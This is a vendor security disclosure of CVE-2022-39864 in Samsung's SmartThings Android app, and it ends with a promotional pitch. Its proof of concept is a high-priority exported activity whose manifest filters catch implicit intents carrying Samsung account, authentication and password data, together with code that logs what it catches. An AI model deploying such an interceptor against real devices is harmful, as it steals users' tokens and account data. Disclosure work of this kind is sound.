# Details

<table>
    <tr>
        <td>Name</td>
        <td>SmartThings</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.oneconnect</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.19</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.10.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39864">CVE-2022-39864</a> (SVE-2022-0967)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$3260</td>
    </tr>
</table>

# Description

Oversecured found multiple uses of implicit intents to start activities:
![](Oversecured_report_1.png)
![](Oversecured_report_2.png)

These intents may have been intercepted by third-party apps installed on the same device. This is dangerous because the intents contain sensitive user data, such as tokens, device data, and user settings.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.ONBOARDING" />
        <data android:scheme="onboarding" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.ADDDEVICE_CATALOG" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.DEVICE_EDIT" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.intent.action.WIFIDISPLAYSINKPLAYER" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.GOOGLE_AUTH_MANAGER" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.ONBOARDING" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.ACCEPT_DIALOG" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.samsungaccount.action.REQUEST_CONSENT_AGREEMENT" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.ADD_SMS_RECIPIENTS" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.REQUEST_AUTH_CODE" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.WAITING_DIALOG" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.RECOMMENDED_DEVICE" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.OPEN_TV_WEB_TNC" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.FIND_DEVICE_PLUGIN" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.osp.app.signin.action.ADD_SAMSUNG_ACCOUNT" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.samsungaccount.action.REQUEST_CHANGE_PASSWORD_FROM_WEB_SDK" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.samsungaccount.action.REQUEST_SIGN_OUT_FROM_WEB_SDK" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.samsungaccount.action.REQUEST_CONFIRM_PASSWORD_FROM_WEB_SDK" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.samsungaccount.action.REQUEST_SIGN_IN_FROM_WEB_SDK" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.samsungaccount.action.REQUEST_SIGN_UP_WITH_PARTNER_ACCOUNT_FROM_WEB_SDK" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.samsungaccount.action.REQUEST_SIGN_UP_FROM_WEB_SDK" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.mobileservice.action.ACTION_WEBVIEW_WITH_PASSWORD_EXTERNAL" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.START_ONBOARDING" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.WEB_AUTH_MANAGER" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.oneconnect.action.ADDDEVICE" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:
```java
DumpUtils.dump(getIntent(), getClassLoader());
finish();
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.